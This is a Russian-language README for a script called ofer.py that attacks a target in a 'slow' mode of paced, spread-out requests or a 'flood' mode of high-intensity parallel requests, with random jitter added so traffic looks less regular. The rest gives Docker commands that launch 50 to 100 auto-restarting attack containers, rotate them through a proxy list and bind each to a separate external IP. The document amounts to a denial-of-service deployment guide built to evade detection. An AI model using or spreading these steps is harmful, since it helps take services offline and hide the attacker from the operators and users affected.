## два режима воздействия на цель

* slow — медленные запросы с паузой и размазанным трафиком;
* flood — высокая интенсивность, меньше задержка и больше параллельных воркеров.

Также внедрил случайную jitter-паузы, чтобы поток выглядел менее регулярным.

## Использование:

Что бы запустить запоращивающий им входы режим: python3 ofer.py slow
Что бы запустить флуд режим на процессор: python3 ofer.py flood

Если аргумент не передан, используется режим по умолчанию — flood.


## Удаление контейнеров

docker rm -f $(docker ps -a -q --filter "name=ofer_")

## Создание образа

docker build -t ofer-app .

## Запуск пачки контейнеров

for i in {1..50}; do docker run -d --name "ofer_$i" --restart unless-stopped ofer-app; done

## Запуск контейнеров через прокси

### Через один прокси

for i in {1..100}; do 
  docker run -d \
    --name "ofer_$i" \
    --restart unless-stopped \
    -e PROXY_URL="http://123.45.67" \
    ofer-app
done

mapfile -t PROXY_LIST < proxies.txt
NUM_PROXIES=${#PROXY_LIST[@]}

### Через разные прокси

for i in {1..100}; do
  CURRENT_PROXY=${PROXY_LIST[$(( (i-1) % NUM_PROXIES ))]}
  docker run -d \
    --name "ofer_$i" \
    --restart unless-stopped \
    -e PROXY_URL="$CURRENT_PROXY" \
    ofer-app
done

## Привязка контейнеров к IP через Macvlan/Ipvlan

Создайте Docker-сеть типа ipvlan (она безопаснее и проще, чем macvlan, так как не генерирует лишние MAC-адреса):

bashdocker network create -d ipvlan \
  --subnet=ВНЕШНЯЯ_ПОДСЕТЬ_СЕРВЕРА/24 \
  --gateway=ВНЕШНИЙ_ШЛЮЗ_ПРОВАЙДЕРА \
  -o parent=eth0 ip_vlan_net

При запуске контейнера жестко укажите ему один из ваших свободных внешних IP-адресов:

bashdocker run -d --name "ofer_1" --net ip_vlan_net --ip ВНЕШНИЙ_IP_1 ofer-app

